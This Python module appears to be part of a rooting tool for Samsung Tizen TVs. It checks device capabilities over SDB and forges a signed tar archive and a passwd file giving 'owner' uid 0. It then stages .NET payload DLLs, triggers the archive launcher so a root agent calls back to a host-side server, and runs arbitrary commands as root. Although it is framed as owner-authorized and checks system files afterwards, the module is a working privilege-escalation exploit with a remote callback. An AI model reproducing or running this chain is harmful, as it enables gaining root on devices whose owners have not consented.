"""SDK archive launcher root route for owner-authorized TVs."""

from __future__ import annotations

import asyncio
import io
import ipaddress
import json
import re
import secrets
import subprocess
import tarfile
import tempfile
from collections.abc import Awaitable, Callable
from dataclasses import dataclass
from pathlib import Path, PurePosixPath

from .resources import payload_directory
from .root_agent import (
    RootAgentConnection,
    RootAgentServer,
    generate_secret,
    write_secret,
)
from .sdb import CaptureResult, SdbClient, SdbError, find_sdb, route_callback_host


STAGING_ROOT = PurePosixPath("/home/owner/share/tmp/sdk_tools")
ON_DEMAND = STAGING_ROOT / "on-demand"
PAYLOAD_FILES = (
    "SamsungTvArchiveRoot.dll",
    "SamsungTvRootAgent.dll",
)
RUNTIME_CONFIG_FILES = (
    "SamsungTvArchiveRoot.runtimeconfig.json",
    "SamsungTvRootAgent.runtimeconfig.json",
)
SYSTEM_HASH_COMMAND = "sha256sum /etc/passwd /usr/share/sdbd/public.pem"


class ArchiveRootError(RuntimeError):
    pass


@dataclass(frozen=True)
class TargetAssessment:
    capabilities: str
    original_hashes: str
    runtime: str


def _capture(client: SdbClient, command: str, timeout: float = 15.0) -> str:
    result = client.capture(command, timeout=timeout)
    if "[exit:0]" not in result.output:
        raise ArchiveRootError(
            f"SDK command failed: {command}: {result.output.strip()}"
        )
    return result.output.split("\n[exit:0]", 1)[0].strip()


def _file_capabilities(line: str) -> dict[str, str]:
    result: dict[str, str] = {}
    for names, flags in re.findall(
        r"(cap_[a-z0-9_]+(?:,cap_[a-z0-9_]+)*)[=+]([eip]+)", line
    ):
        for name in names.split(","):
            result[name] = flags
    return result


def _check_target(client: SdbClient) -> TargetAssessment:
    client.connect()
    client.require_device()
    client.require_shell_injection()
    capabilities = _capture(client, "getcap /usr/bin/dotnet /usr/sbin/sdbd-tarlauncher")
    lines = capabilities.splitlines()
    dotnet = next((line for line in lines if "/usr/bin/dotnet" in line), "")
    launcher = next(
        (line for line in lines if "/usr/sbin/sdbd-tarlauncher" in line), ""
    )
    dotnet_caps = _file_capabilities(dotnet)
    launcher_caps = _file_capabilities(launcher)
    if not all(
        "e" in dotnet_caps.get(name, "") for name in ("cap_setgid", "cap_sys_admin")
    ):
        raise ArchiveRootError("dotnet lacks effective SETGID/SYS_ADMIN capabilities")
    if not all(
        "e" in launcher_caps.get(name, "") for name in ("cap_setgid", "cap_setuid")
    ):
        raise ArchiveRootError(
            "sdbd-tarlauncher lacks effective SETUID/SETGID capabilities"
        )
    try:
        runtimes = _capture(client, "/usr/bin/dotnet --list-runtimes")
    except ArchiveRootError as error:
        if "Unknown option --list-runtimes." not in str(error):
            raise
        # Samsung's apphost may reject SDK options. Resolve the active runtime
        # instead of choosing one of the compatibility aliases in shared/.
        runtime_path = _capture(
            client,
            "r=/usr/share/dotnet.tizen/netcoreapp; "
            'test -r "$r/libcoreclr.so" && '
            'test -r "$r/System.Private.CoreLib.dll" && readlink -f "$r"',
        )
        match = re.fullmatch(
            r"/usr/share/dotnet/shared/Microsoft\.NETCore\.App/(\d+\.\d+\.\d+)",
            runtime_path,
        )
        if match is None:
            raise ArchiveRootError(
                f"unrecognized active .NET runtime path: {runtime_path}"
            ) from error
        runtimes = f"Microsoft.NETCore.App {match.group(1)} [{runtime_path}]"
    majors = {
        int(match.group(1))
        for line in runtimes.splitlines()
        if (match := re.match(r"Microsoft\.NETCore\.App (\d+)\.\d+\.\d+\s+\[", line))
    }
    if any(major >= 6 for major in majors):
        runtime = "6.0"
    elif 3 in majors and any(
        re.match(r"Microsoft\.NETCore\.App 3\.1\.\d+\s+\[", line)
        for line in runtimes.splitlines()
    ):
        runtime = "3.1"
    else:
        raise ArchiveRootError("no supported Microsoft.NETCore.App runtime (3.1 or 6+)")
    tar_options = _capture(client, "/usr/bin/tar --help | grep -- --to-command")
    if "--to-command" not in tar_options:
        raise ArchiveRootError("TV tar does not support --to-command")
    return TargetAssessment(
        capabilities, _capture(client, SYSTEM_HASH_COMMAND), runtime
    )


def _openssl(*arguments: str) -> None:
    try:
        result = subprocess.run(
            ("openssl", *arguments), capture_output=True, text=True, check=False
        )
    except FileNotFoundError as error:
        raise ArchiveRootError(
            "OpenSSL was not found; install it on the host and put openssl on PATH"
        ) from error
    if result.returncode != 0:
        raise ArchiveRootError(
            f"openssl {arguments[0]} failed: {result.stderr.strip()}"
        )


def _prepare_artifacts(
    directory: Path,
    runtime: str,
    package: str,
    callback_host: str,
    callback_port: int,
    secret: bytes,
) -> None:
    staging = STAGING_ROOT / package
    private_key = directory / "private.pem"
    public_key = directory / "public.pem"
    archive = directory / f"{package}.tar.gz"
    signature = directory / f"{package}.tar.gz.signature"
    _openssl(
        "genpkey",
        "-algorithm",
        "RSA",
        "-pkeyopt",
        "rsa_keygen_bits:2048",
        "-out",
        str(private_key),
    )
    _openssl("pkey", "-in", str(private_key), "-pubout", "-out", str(public_key))
    (directory / "passwd").write_text(
        "owner:x:0:0:owner:/home/owner:/bin/sh\n", encoding="ascii"
    )
    runtime_version = "3.1.0" if runtime == "3.1" else "6.0.0"
    runtime_config = {
        "runtimeOptions": {
            "tfm": "netcoreapp3.1" if runtime == "3.1" else "net6.0",
            "rollForward": "Major" if runtime == "6.0" else "LatestPatch",
            "framework": {
                "name": "Microsoft.NETCore.App",
                "version": runtime_version,
            },
        }
    }
    for name in RUNTIME_CONFIG_FILES:
        (directory / name).write_text(
            json.dumps(runtime_config) + "\n", encoding="ascii"
        )
    write_secret(directory / "root-agent.token", secret)
    script = (
        "#!/bin/sh\n"
        f"exec /usr/bin/dotnet {staging}/SamsungTvRootAgent.dll "
        f"{callback_host} {callback_port} {staging}/root-agent.token {staging}\n"
    ).encode("ascii")
    with tarfile.open(archive, "w:gz") as output:
        member = tarfile.TarInfo("launch.sh")
        member.size = len(script)
        member.mode = 0o600
        member.mtime = 0
        output.addfile(member, io.BytesIO(script))
    _openssl(
        "dgst",
        "-sha256",
        "-sign",
        str(private_key),
        "-out",
        str(signature),
        str(archive),
    )
    _openssl(
        "dgst",
        "-sha256",
        "-verify",
        str(public_key),
        "-signature",
        str(signature),
        str(archive),
    )


def _stage(client: SdbClient, directory: Path, payloads: Path, package: str) -> None:
    staging = STAGING_ROOT / package
    _capture(client, f"/bin/mkdir -p {staging}")
    _capture(client, f"/bin/mkdir -p {ON_DEMAND}")
    for name in PAYLOAD_FILES:
        source = payloads / name
        if not source.is_file():
            raise ArchiveRootError(f"missing payload {source}")
        client.push(source, staging / name)
    for name in RUNTIME_CONFIG_FILES:
        client.push(directory / name, staging / name)
    for name in ("public.pem", "passwd", "root-agent.token"):
        client.push(directory / name, staging / name)
    archive_name = f"{package}.tar.gz"
    client.push(directory / archive_name, ON_DEMAND / archive_name)
    client.push(
        directory / f"{archive_name}.signature",
        ON_DEMAND / f"{archive_name}.signature",
    )


def _cleanup(client: SdbClient, package: str) -> bool:
    staging = STAGING_ROOT / package
    archive = ON_DEMAND / f"{package}.tar.gz"
    signature = ON_DEMAND / f"{package}.tar.gz.signature"
    _capture(client, f"/bin/rm -rf {staging}")
    _capture(client, f"/bin/rm -f {archive}")
    _capture(client, f"/bin/rm -f {signature}")
    for path in (staging, archive, signature):
        if _capture(client, f"test ! -e {path} && echo absent") != "absent":
            return False
    return True


async def probe(
    tv_host: str,
    *,
    model: str | None = None,
    callback_host: str | None = None,
    bind_host: str | None = None,
    sdb_timeout: float = 15.0,
    accept_timeout: float = 30.0,
    command_timeout: float = 45.0,
    commands: tuple[str, ...] = (),
    payloads: Path | None = None,
    session_handler: Callable[[RootAgentConnection], Awaitable[int]] | None = None,
) -> dict[str, object]:
    ipaddress.IPv4Address(tv_host)
    callback = callback_host or route_callback_host(tv_host)
    ipaddress.IPv4Address(callback)
    bind = bind_host or callback
    ipaddress.IPv4Address(bind)
    client = SdbClient(find_sdb(), tv_host, timeout=sdb_timeout)
    assessment = await asyncio.to_thread(_check_target, client)
    payloads = payloads or payload_directory(
        "common31" if assessment.runtime == "3.1" else "common"
    )
    for name in PAYLOAD_FILES:
        if not (payloads / name).is_file():
            build_target = (
                "common31-payload" if assessment.runtime == "3.1" else "common-payload"
            )
            raise ArchiveRootError(
                f"missing payload {payloads / name}; re-extract the release or "
                f"run 'make {build_target}' in the source checkout"
            )
    package = "archive-root-" + secrets.token_hex(8)
    staging_started = False
    launch_task: asyncio.Task[CaptureResult] | None = None
    server = RootAgentServer(bind, 0, tv_host, generate_secret(), require_root=True)
    await server.start()
    try:
        with tempfile.TemporaryDirectory(prefix="samsung-tv-archive-root-") as temp:
            directory = Path(temp)
            _prepare_artifacts(
                directory,
                assessment.runtime,
                package,
                callback,
                server.listening_port,
                server.secret,
            )
            staging_started = True
            await asyncio.to_thread(_stage, client, directory, payloads, package)
            command = (
                f"/usr/bin/dotnet {STAGING_ROOT / package}/SamsungTvArchiveRoot.dll "
                f"{package}"
            )
            launch_task = asyncio.create_task(
                asyncio.to_thread(
                    client.capture,
                    command,
                    callback_host=callback,
                    bind_host=bind,
                    timeout=accept_timeout + 20,
                    persistent=session_handler is not None,
                )
            )
            try:
                connection = await server.accept(accept_timeout)
            except Exception as error:
                log_result = await asyncio.to_thread(
                    client.capture,
                    f"/bin/cat {STAGING_ROOT / package}/launcher.log",
                    timeout=10,
                )
                log = log_result.output.strip()
                launch_output = "pending"
                if launch_task.done():
                    try:
                        launch_output = launch_task.result().output.strip()
                    except Exception as launch_error:
                        launch_output = str(launch_error)
                raise ArchiveRootError(
                    f"no authenticated root callback; launch output: {launch_output}; "
                    f"launcher log: {log}"
                ) from error
            try:
                identity = await connection.ping()
                evidence = {
                    "model": model,
                    "host": tv_host,
                    "runtime": assessment.runtime,
                    "authenticated": True,
                    "uid": identity.uid,
                    "euid": identity.euid,
                    "gid": identity.gid,
                    "egid": identity.egid,
                    "cap_eff": identity.effective_capabilities,
                    "smack": identity.smack_label.strip(),
                    "preflight_capabilities": assessment.capabilities,
                }
                if commands:
                    evidence["commands"] = []
                    for command_text in commands:
                        result = await connection.execute(command_text, command_timeout)
                        evidence["commands"].append(
                            {
                                "command": command_text,
                                "exit_code": result.exit_code,
                                "timed_out": result.timed_out,
                                "stdout": result.stdout,
                                "stderr": result.stderr,
                            }
                        )
                if session_handler is not None:
                    evidence["session_exit"] = await session_handler(connection)
            finally:
                await connection.shutdown()
            if launch_task is not None:
                try:
                    launch_result = await asyncio.wait_for(launch_task, timeout=15)
                except TimeoutError:
                    if session_handler is None:
                        raise
                    # Long sessions may outlive the SDB launch transport. The
                    # authenticated agent has shut down; require the independent
                    # cleanup and system-file checks below before returning.
                    evidence["launcher_exit_observed"] = False
                else:
                    evidence["launcher_exit_observed"] = True
                    if "[exit:0]" not in launch_result.output:
                        raise ArchiveRootError(
                            "launcher exited unsuccessfully: "
                            + launch_result.output.strip()
                        )
            return evidence
    finally:
        await server.close()
        if launch_task is not None and not launch_task.done():
            try:
                await asyncio.wait_for(launch_task, timeout=5)
            except Exception:
                pass
        cleaned = False
        if staging_started:
            if session_handler is not None:
                # SDB may expire while a long authenticated root session runs.
                # Reconnect before the SDK-side cleanup and final hash check.
                try:
                    await asyncio.to_thread(client.connect)
                except SdbError:
                    pass
            try:
                cleaned = await asyncio.to_thread(_cleanup, client, package)
            except (ArchiveRootError, SdbError):
                pass
        final_hashes = await asyncio.to_thread(_capture, client, SYSTEM_HASH_COMMAND)
        if "evidence" in locals():
            evidence["system_files_unchanged"] = (
                final_hashes == assessment.original_hashes
            )
            evidence["staging_cleaned"] = cleaned
            if not evidence["system_files_unchanged"] or not cleaned:
                raise ArchiveRootError(
                    "root callback succeeded, but system-file or cleanup checks failed; "
                    f"staging={STAGING_ROOT / package}"
                )
